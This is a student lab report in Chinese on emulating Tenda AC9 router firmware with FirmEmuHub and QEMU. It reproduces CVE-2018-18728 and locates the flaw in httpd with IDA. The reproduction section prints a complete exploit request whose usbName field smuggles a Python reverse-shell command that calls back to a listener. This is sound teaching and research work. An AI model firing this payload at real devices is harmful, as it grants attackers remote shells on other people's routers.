# 实验四：用户态固件仿真实验

## 一、 实验目的

1. 掌握用户态固件仿真的基本原理与实现方法，理解在不依赖真实硬件设备的情况下，对嵌入式固件进行模拟运行与分析的基本流程。

2. 学习并使用 FirmEmuHub 工具搭建用户态固件仿真实验环境，掌握固件文件系统提取、运行环境修复以及 Web 服务启动等关键步骤。

3. 以 Tenda AC9 固件为对象，完成其用户态仿真与 Web 管理界面的访问验证，加深对路由器固件结构和运行机制的认识。

4. 复现 CVE-2018-18728 命令注入漏洞，分析漏洞触发条件、利用方式及危害，理解嵌入式设备 Web 接口中命令注入漏洞的形成原因。

5. 结合逆向分析工具对漏洞程序 bin/httpd 进行定位和分析，理解漏洞函数的执行逻辑，为后续安全研究和漏洞挖掘提供实践基础。

## 二、 实验环境

本实验在 Windows 主机 + Ubuntu 虚拟机 的环境下完成，按照实验手册要求，在 Ubuntu 系统中搭建用户态固件仿真环境，并完成后续漏洞复现与分析。实验所使用的主要环境如下。

### （一）硬件环境
- 主机操作系统：Windows
- 虚拟化平台：VirtualBox
- 虚拟机操作系统：Ubuntu 24.04 LTS 64位
- 处理器：支持虚拟化技术
- 内存：4GB
- 磁盘空间：30GB

### （二）软件环境
- Git
- Docker
- Python 3.8 及以上版本
- QEMU
- binwalk
- IDA Pro 或 Ghidra（用于后续漏洞逆向分析）

### （三）网络环境

为满足固件仿真与后续 Web 页面访问需求，虚拟机网络采用双网卡模式配置：

- 网卡1使用 NAT 模式，用于虚拟机访问互联网，完成软件安装、依赖下载与镜像拉取；
- 网卡2使用桥接模式，使虚拟机能够获取局域网地址，便于主机浏览器直接访问仿真启动后的固件 Web 管理界面。

在本次实验中，虚拟机中识别出的网络接口包括：

- enp0s3：NAT 网络接口；
- enp0s8：桥接网络接口。

其中，桥接网卡成功获取到局域网 IP 地址，为后续访问仿真服务提供了网络基础。

## 三、 实验内容

### （一）用户态固件仿真环境搭建

#### 1. 克隆 FirmEmuHub 仓库

首先，在 Ubuntu 虚拟机中进入用户主目录，并克隆 FirmEmuHub 仓库：

```bash
git clone https://github.com/a101e-lab/FirmEmuHub.git
cd ~/FirmEmuHub
```

#### 2. 创建 Python 虚拟环境

为避免依赖安装影响 Ubuntu 系统自带 Python 环境，本实验在 FirmEmuHub 项目目录下创建 Python 虚拟环境：
```bash
python3 -m venv venv
source venv/bin/activate
```

#### 3. 安装项目依赖

根据实验手册要求，需要使用 requirements.txt 安装 FirmEmuHub 的 Python 依赖。由于实验过程中直接访问默认 PyPI 源时出现网络连接和域名解析不稳定的问题，因此改用清华大学 PyPI 镜像源进行安装：
```bash
pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn
```

![alt text](image/2-1.png)

---

### （二）手工启动用户态仿真环境：Tenda AC9

#### 1. 获取 Tenda AC9 固件并检查文件系统

在完成 FirmEmuHub 仓库获取后，根据实验手册检查 Benchmark/BM-2024-00012 中的 Tenda AC9 固件内容。实际检查发现，该 benchmark 在 emulation/firmware/tenda_ac9.zip 中已提供了解包后的文件系统内容，压缩包解压后直接得到 squashfs-root 目录，因此无需再对原始 `.bin` 固件执行 binwalk，后续实验可直接基于 squashfs-root 进行用户态仿真环境搭建。

#### 2. 安装 qemu 和网络配置工具

![alt text](image/2.0.png)

由于本实验环境使用 Ubuntu 24.04 LTS，系统中已无法直接安装 qemu 总包，因此实际安装时改为按功能安装 qemu-system、qemu-user-static、bridge-utils、uml-utilities 与 ifupdown 等组件包，以满足用户态固件仿真和网络桥接配置需求。

```bash
sudo apt update
sudo apt install -y qemu-user-static qemu-system bridge-utils uml-utilities ifupdown
```

![alt text](image/2.1.png)

由上图可得，QEMU 已经安装成功。

#### 3. 网络配置

为保证固件用户态仿真过程中 QEMU 能够正常创建网络接口，并使主机能够访问虚拟机中启动的固件 Web 服务，本实验对 Ubuntu 虚拟机进行了桥接网络配置。实验手册中要求配置 `/etc/network/interfaces` 和 `/etc/qemu-ifup`，并通过 br0 桥接接口将虚拟机网卡接入网络环境。

##### 3.1 查看虚拟机网卡信息

首先在 Ubuntu 虚拟机终端中使用如下命令查看当前网络接口信息：
```bash
ip a
```
根据命令输出可知，虚拟机中主要存在两个网络接口：enp0s3 和 enp0s8。其中，enp0s3 对应 VirtualBox 中配置的 NAT 网卡，用于虚拟机访问互联网；enp0s8 对应桥接网卡，用于后续构建桥接接口 br0。本实验中，桥接网卡名称与实验手册中的示例一致，均为 enp0s8。

##### 3.2  配置 `/etc/network/interfaces`
```bash
sudo nano /etc/network/interfaces
```
根据实验手册要求，将文件内容配置如下：

![alt text](image/3.5.png)

##### 3.3  配置 `/etc/qemu-ifup`
```bash
sudo nano /etc/qemu-ifup
```

将文件内容修改为：

![alt text](image/3.6.png)

完成编辑后，为该脚本添加可执行权限：
```bash
sudo chmod a+x /etc/qemu-ifup
```

随后使用如下命令验证权限是否配置成功：

```bash
ls -l /etc/qemu-ifup
```

![alt text](image/3.7.png)

可以看到文件权限中已包含 x，说明 `/etc/qemu-ifup` 已具备可执行权限。

##### 3.4 启动桥接接口 `br0`

```bash
sudo ifup br0
sudo systemctl restart systemd-networkd.service
```

![alt text](image/3.0.png)

至此，桥接接口 `br0` 已完成启动。

##### 3.5 验证桥接配置结果

最后，使用以下命令检查网络配置是否生效：
```bash
ip a
ip route
brctl show
```
![alt text](image/3.1.png)

在 ip a 输出中，可以看到系统已成功创建 br0 接口，且其状态为 UP，说明桥接接口已经启动。同时，br0 获得了 IPv4 地址：

```bash
inet 192.168.1.15/24
```

![alt text](image/3.4.png)

该结果表明 enp0s8 已经成功加入桥接接口 br0，符合实验手册中通过 bridge_ports enp0s8 配置桥接网络的要求。至此，Ubuntu 虚拟机中的桥接网络配置完成，为后续启动 Tenda AC9 固件 Web 服务和主机访问仿真页面提供了网络基础。

#### 4. 开启路由器 Web 服务

在完成 QEMU 用户态运行环境和网络桥接配置后，进入 Tenda AC9 固件解压后的根文件系统目录 squashfs-root，准备启动固件中的 Web 服务。实验手册要求在该目录下复制 qemu-arm-static，修复 Web 资源目录，并通过 QEMU 用户态方式运行 bin/httpd。

```bash
cd ~/FirmEmuHub/Benchmark/BM-2024-00012/emulation/firmware/tenda_ac9_unzip/squashfs-root
pwd
ls
```
![alt text](image/4.0.png)

随后将 QEMU ARM 静态解释器复制到当前目录中：
```bash
sudo cp /usr/bin/qemu-arm-static qemu-arm-static
ls -l qemu-arm-static
```

接着对 Web 资源目录进行修复。由于固件中的部分 Web 页面资源位于 webroot_ro 目录下，为保证 httpd 服务启动后能够正常加载 Web 管理页面，需要将 webroot_ro 中的内容复制到 webroot 目录：
```bash
cp -r webroot_ro/* webroot/
```

随后赋予 bin/httpd 执行权限：
```bash
chmod +x bin/httpd
ls -l bin/httpd
```

完成上述准备工作后，使用以下命令启动路由器 Web 服务：
```bash
sudo ./qemu-arm-static -L ./ bin/httpd
```
![alt text](image/4.2.png)

程序启动后，终端输出如下关键信息：
```bash
httpd listen ip = 192.168.1.15 port = 80
webs: Listening for HTTP requests at address 192.168.1.15
```

最后，在浏览器中访问：

```text
http://192.168.1.15/
```

![alt text](image/4.3.png)

综上，本步骤成功完成了 Tenda AC9 固件 Web 服务的用户态启动与访问验证，为后续漏洞复现和漏洞原理分析提供了可交互的仿真环境。

---

### （三）一键固件仿真

在完成用户态固件仿真环境搭建后，继续按照实验手册要求，使用 FirmEmuHub 提供的一键仿真脚本启动 Tenda AC9 固件仿真环境。

```bash
sudo ./venv/bin/python3 emulation.py -b ./Benchmark/BM-2024-00012
```

![alt text](image/2-2.png)

该输出说明 Tenda AC9 固件仿真环境已经成功启动，并将 Web 服务映射到本机 32768 端口。

在 Ubuntu 虚拟机浏览器中访问：

```text
http://127.0.0.1:32768/main.html
```

![alt text](image/2-3.png)

浏览器成功打开 Tenda WiFi Web 管理界面。

---

### （四）漏洞复现

在完成 Tenda AC9 固件的一键仿真并成功访问 Web 管理界面后，继续按照实验手册要求复现 CVE-2018-18728 命令注入漏洞。该漏洞存在于 Tenda AC9 固件的 Web 服务程序 `bin/httpd` 中，攻击者可以通过向特定接口 `/goform/SetSambaCfg` 发送构造后的 POST 请求，使请求参数中的命令被后端程序执行，从而实现远程命令执行。

#### 1. 漏洞背景

根据实验手册说明，本次复现的漏洞类型为命令注入漏洞，影响组件为固件中的 bin/httpd 文件。漏洞触发点位于 Samba 配置相关接口 /goform/SetSambaCfg。当请求参数中的 action 满足特定条件时，后端程序会将 usbName 参数拼接到系统命令中执行，如果该参数缺少有效过滤，就可能导致攻击者注入额外命令。

本实验在本地 Ubuntu 虚拟机中的 Docker 仿真环境下进行，目标服务地址为：
```
http://127.0.0.1:32768/main.html
```

对应的漏洞接口为：
```
http://127.0.0.1:32768/goform/SetSambaCfg
```


#### 2. 使用 netcat 监听反向连接

在发送漏洞请求前，首先在 Ubuntu 虚拟机中新建一个终端，使用 netcat 监听 8888 端口：
```bash
nc -lvnp 8888
```

#### 3. 使用 Yakit 构造并发送漏洞请求

在 Yakit 的 Web Fuzzer 中构造如下请求：
```http
POST /goform/SetSambaCfg HTTP/1.1
Host: 127.0.0.1:32768
Proxy-Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: password=lqetgb
Content-Type: application/x-www-form-urlencoded
Connection: close

password=111111&premitEn=0&internetPort=21&action=del&usbName=;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';&guestpwd=guest&guestuser=guest&guestaccess=r&fileCode=UTF-8
```

其中，`action=del` 用于满足漏洞触发条件；`usbName` 参数中以分号 ; 开始拼接额外命令，使后端在执行原有命令时同时执行注入的 Python 反向连接命令。该命令会尝试连接 Ubuntu 虚拟机的 `172.17.0.1:8888`，并将标准输入、标准输出和标准错误重定向到 socket，从而形成一个交互式 Shell。

![alt text](image/4-1.png)

#### 4. 漏洞复现结果

点击 Yakit 中的“发送请求”按钮后，虽然 Yakit 右侧显示请求超时或服务端异常，但 netcat 监听窗口成功接收到来自 Docker 容器的连接，显示如下：

![alt text](image/4-4.png)

该结果表明，构造的 POST 请求成功触发了 usbName 参数中的命令注入逻辑，目标固件容器执行了 payload 中的反向 Shell 命令，并成功连接回 Ubuntu 虚拟机的监听端口。

---

### （五）漏洞原理分析

在完成 `CVE-2018-18728` 漏洞复现后，为进一步分析漏洞产生原因，本实验使用 IDA 对 Tenda AC9 固件中的 Web 服务程序 httpd 进行静态逆向分析。根据实验手册要求，本部分主要通过关键字符串定位漏洞相关函数，并结合伪代码分析 usbName 参数与命令执行函数之间的关系。

#### 1. 使用 IDA 加载 httpd 文件
首先在 Ubuntu 虚拟机中进入固件解包后的 bin 目录，查看 httpd 文件信息：
```bash
cd ~/FirmEmuHub/Benchmark/BM-2024-00012/emulation/firmware/tenda_ac9_unzip/squashfs-root/bin
ls -l httpd
file httpd
```

实验中输出结果如下：

```bash
-rwxr-xr-x 1 chloe chloe 982880  1月 24  2023 httpd
httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

由此可知，httpd 是一个 32 位 ARM 架构的 ELF 可执行文件，动态链接到 `/lib/ld-uClibc.so.0`，且文件已经被 stripped 处理，符号信息不完整。因此，在后续 IDA 分析中，需要结合字符串、交叉引用和伪代码来定位漏洞函数。

#### 2. 通过关键字符串定位漏洞函数
由于 httpd 文件已被 stripped，不能完全依赖函数符号进行定位。因此，本实验按照实验手册思路，通过搜索关键字符串定位漏洞函数。在 IDA 中按 Shift + F12 打开 Strings 窗口，并查找与 Samba 配置接口相关的字符串。

在 Strings 窗口中可以看到如下关键字符串集中出现：

![alt text](image/5-1.png)

其中，action、usbName、guestpwd、guestuser 等字符串与前面漏洞复现请求中的 POST 参数一致，说明该区域与 `/goform/SetSambaCfg` 接口处理逻辑密切相关。

```
DATA XREF: formSetSambaConf+CC
DATA XREF: formSetSambaConf+D0
```
由此可以确定，`formSetSambaConf` 是处理 `Samba` 配置请求的关键函数，也是本次漏洞分析的核心函数。

#### 3. 分析漏洞函数 formSetSambaConf

跳转到 formSetSambaConf 后，使用 IDA 的反编译功能查看伪代码。关键代码如下：

```c
s1 = (char *)sub_2B9D4(a1, "action", &unk_F0400);
v9 = (const char *)sub_2B9D4(a1, "usbName", &unk_F0400);
v8 = sub_2B9D4(a1, "guestpwd", &unk_F0400);
v7 = sub_2B9D4(a1, "guestuser", &unk_F0400);
v6 = sub_2B9D4(a1, "guestaccess", &unk_F0400);
v5 = sub_2B9D4(a1, "fileCode", &unk_F0400);
if ( !strcmp(s1, "del") )
{
    doSystemCmd("cfm post netctrl %d?op=%d,string_info=%s", 51, 3, v9);
    sub_2C354(a1, "HTTP/1.0 200 OK\r\n\r\n");
    sub_2C354(a1, "{\"errCode\":\"0\"}");
    return sub_2C89C(a1, 200);
}
```

![alt text](image/5-2.png)

其中，sub_2B9D4() 用于从 HTTP 请求中读取参数。结合参数名称可以判断，程序分别从请求中读取了 action、usbName、guestpwd、guestuser、guestaccess 等字段。其中：

```c
s1 = (char *)sub_2B9D4(a1, "action", &unk_F0400);
```
表示从请求中读取 action 参数，并保存到变量 s1；

```c
v9 = (const char *)sub_2B9D4(a1, "usbName", &unk_F0400);
```

表示从请求中读取 usbName 参数，并保存到变量 v9。

随后，程序通过如下条件判断请求动作是否为删除操作：

```c
if ( !strcmp(s1, "del") )
```

当 action 参数等于 "del" 时，程序进入该分支，并执行：
```c
doSystemCmd("cfm post netctrl %d?op=%d,string_info=%s", 51, 3, v9);
```

可以看到，用户可控的 `usbName` 参数，即变量 `v9`，被作为 `%s` 参数传入 `doSystemCmd()`。由于 `doSystemCmd()` 属于系统命令执行相关函数，如果传入参数没有经过严格过滤或转义，就可能导致用户输入被拼接进系统命令中执行。

#### 4. 漏洞成因分析

通过上述逆向分析可以看出，该漏洞的核心原因在于：formSetSambaConf 函数直接从 HTTP 请求中读取 usbName 参数，并在 action=del 条件下将该参数传入 doSystemCmd()。由于 usbName 属于用户可控输入，而程序在调用系统命令执行函数前没有对其进行充分过滤、转义或白名单校验，因此攻击者可以在 usbName 参数中插入命令分隔符和额外命令。

本实验第四部分构造的 payload 中，usbName 参数被设置为：

```
usbName=;python -c '...'
```
其中，分号 `;` 用于分隔原始命令和后续注入命令。当后端程序执行 doSystemCmd() 时，usbName 中的 Python 反向连接命令会被拼接到系统命令中执行，从而使目标固件容器向 Ubuntu 虚拟机的 `172.17.0.1:8888` 建立反向连接。前面实验中 `netcat` 成功接收到来自 `172.17.0.2` 的连接，并能够执行 `ls` 命令查看固件文件系统目录，进一步验证了该漏洞的可利用性。


## 四、实验总结

本次实验围绕 Tenda AC9 固件完成了从环境搭建到漏洞复现与原理分析的完整流程。实验中先在 Ubuntu 虚拟机中配置 QEMU、Docker、FirmEmuHub 和网络环境，成功通过手工方式和 FirmEmuHub 一键方式启动固件 Web 服务，并访问到 Tenda 路由器管理界面；随后使用 Yakit 构造针对 /goform/SetSambaCfg 接口的 POST 请求，通过 nc 监听反向连接，成功获得来自固件容器的 Shell，验证了 CVE-2018-18728 命令注入漏洞；最后使用 IDA 对 httpd 文件进行静态分析，定位到 formSetSambaConf 函数，发现用户可控的 usbName 参数在 action=del 条件下被传入 doSystemCmd()，从而导致命令注入。通过本次实验，我掌握了固件解包、用户态仿真、漏洞复现和逆向分析的基本方法，也加深了对 IoT 设备命令注入漏洞成因与验证流程的理解。
